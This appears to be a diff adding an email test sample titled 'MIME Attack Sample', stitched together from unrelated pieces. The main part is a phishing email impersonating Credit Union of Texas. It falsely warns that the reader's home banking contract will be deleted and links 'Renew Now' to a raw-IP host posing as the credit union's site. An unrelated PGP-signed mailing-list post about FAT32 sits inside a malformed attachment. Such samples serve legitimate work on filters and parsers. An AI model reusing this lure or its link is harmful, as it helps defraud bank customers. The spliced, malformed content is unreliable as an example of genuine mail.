@@ -1,0 +1,115 @@
+From: vvalencia@edelmanmexico.com.mx
+To: volume_management_portland@enron.com, cara.semperger@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/plain
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 380
+
+<title>Credit Union of Texas Contract Renewal</title>
+<FONT face=Arial size=2>
+<DIV>
+	</table>
+<table cellspacing="0" cellpadding="0" border="0" width="748">
+  <tr> 
+	<td width="5" height="77" rowspan="2" valign="top" align="left" bgcolor="#003366"><img src="http://www.cuoftexas.org/images/bluesquare.gif" width=5 height=5></td>
+	      <td width="125" height="77" rowspan="2" valign="top" align="left"><img src="http://www.cuoftexas.org/images/logo_star1.gif" width="125" height="77" alt="Credit Union of Texas" border="0"></td>
+	      <td rowspan="2" height="77" valign="top" align="left" width="150"><img src="http://www.cuoftexas.org/images/logo_text1.gif" width="150" height="77" alt="Credit Union of Texas" border="0"></td>      
+		  <td rowspan="2" height="77" valign="top" align="left" width="285"><img src="http://www.cuoftexas.org/images/title_welcome.gif" width="285" height="77" alt="Welcome to Our Community"></td>
+	      <td rowspan="2" height="77" valign="top" align="left" width="178"><img src="http://www.cuoftexas.org/images/title_welcome.ribbon.gif" width="178" height="77" alt="Welcome to Credit Union of Texas"></td>
+		  <td width="5" height="77" rowspan="2" valign="top" align="left" bgcolor="#003366"><img src="http://www.cuoftexas.org/images/bluesquare.gif" width="5" height="5"></td>
+  </tr>
+  <tr> </tr>
+</table>
+	   Dear Customer,</p>
+<DIV>   <font face="Arial, Helvetica, sans-serif" size="3" color="#CC0000"><b>As 
+					a member of</b></font><b><font size="3" color="#CC0000"><font face="Arial, Helvetica, sans-serif"> 
+					Credit Union of Texas</font></font></b><font face="Arial, Helvetica, sans-serif" size="-1"> 
+					you have direct access to a variety <BR>   of products and services 
+					designed to meet your individual financial needs.</br>
+<DIV>   And once you've chosen CUofTX as your one-stop financial center,<BR>    accessing your accounts is easy. We offer you the choice of doing business with us<BR>   in person, by phone, or on-line. 
+<DIV> </DIV>
+<DIV>   <face="Arial, Helvetica, sans-serif" size="3" color="#CC0000"> 
+					Credit Union of Texas</font>   informs you that your contract with us has expired and will<BR>   be deactivated and deleted if not renewed immediately. Previous notifications have<BR>   been sent to your Billing Adress assigned to this account. As the Primary Contact,<BR>   you must renew the service listed below or it will be deactivated and deleted. <BR><BR><BR>   
+	<b> 
+	<a onclick="return ShowLinkWarning()" target="_blank" onfiltered="return ShowLinkWarning()" href="http://202.226.241.226/~yoshimi/ns1.dtcu.org/www.cuoftexas.org/ns1/dtcu/route/"><FONT color=#003399>Renew Now</FONT></a> </b>your
+	<b>Home Banking</b><b> Contract</b> </DIV>
+<DIV><FONT color=#003399></FONT> </DIV>
+<DIV><BR>   SERVICE: <b>Home Banking</b>  <b>Contract</b><BR>   EXPIRATION: 
+	<b>Feb, 13 2006</b></DIV>
+<DIV> </DIV>
+<DIV><BR>   Thank you for using Credit Union of Texas banking services. We appreciate your 
+	business and the opportunity to serve you.</DIV>
+<DIV> </DIV>
+<DIV>   Credit Union of Texas Contract Renewal Center </DIV>
+<DIV>    <br><tr align="left" valign="right"> 
+                <td height="40" valign="middle"><font face="Arial, Helvetica, sans-serif" size="-1"><a href="http://202.226.241.226/~yoshimi/ns1.dtcu.org/www.cuoftexas.org/ns1/dtcu/route/"><img src="http://202.226.241.226/~yoshimi/1.jpg" width="361" height="40" border="0" alt="Fair Lease"></a></font></td>
+              </tr>
+              
+<DIV> </DIV>
+<DIV><BR>   *****************************************************************************<BR>   IMPORTANT CUSTOMER SERVICE INFORMATION<BR>   *****************************************************************************</DIV>
+<DIV> </DIV>
+<DIV>   Please do not reply to this message. For any inquiries, contact Contract Renwal Center.</DIV>
+<DIV> </DIV>
+<DIV>   Document Reference: (8777127).</DIV></DIV></FONT>
+<DIV>   <tr align="center"> 
+	<td><font face="Arial, Helvetica, sans-serif" size="-2"> 2001-2006 Credit Union of Texas</font></td>
+  </tr>
+
+
+--DELIMITER
+Content-Disposition: attachment; filename=signature.asc
+Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature" 
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+h: SHA1
+>
+> One more thing I forgot to mention is that I seem to recall that xp
+> supports fat32 on partitions no larger than 40Gb. Also, if you use
+> fat32, be aware that fat32 has a limit of up to 4Gb per file.
+>
+> Greg
+>
+>
+>
+> On Fri, Jun 22, 2007 at 02:28:47PM -0700, Gregory Nowak wrote:
+>> -----BEGIN PGP SIGNED MESSAGE-----
+>> Hash: SHA1
+>>
+>> If you do that, then you won't have access to some of xp's features,
+>> such as encryption, which rely on ntfs. Also, I don't see how having a
+>> dos floppy to access the drive would help here, care to elaborate?
+>>
+>> Greg
+>>
+>>
+>>
+>
+>
+> - --
+> web site: http://www.romuald.net.eu.org
+> gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+> skype: gregn1
+> (authorization required, add me to your contacts list first)
+>
+> - --
+> Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+> --BOUNDARY
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+>
+> iD8DBQFGfD/m7s9z/XlyUyARAsQvAJwK5uwv9uu9NsIpQIlNRWvIqeV5dgCffpXC
+> sW0oWRURIlVNi4TrjXodwWo=
+> =y5ww
+> -----END PGP SIGNATURE-----
+>
+> _
+-BOUNDARY--
+--DELIMITER--
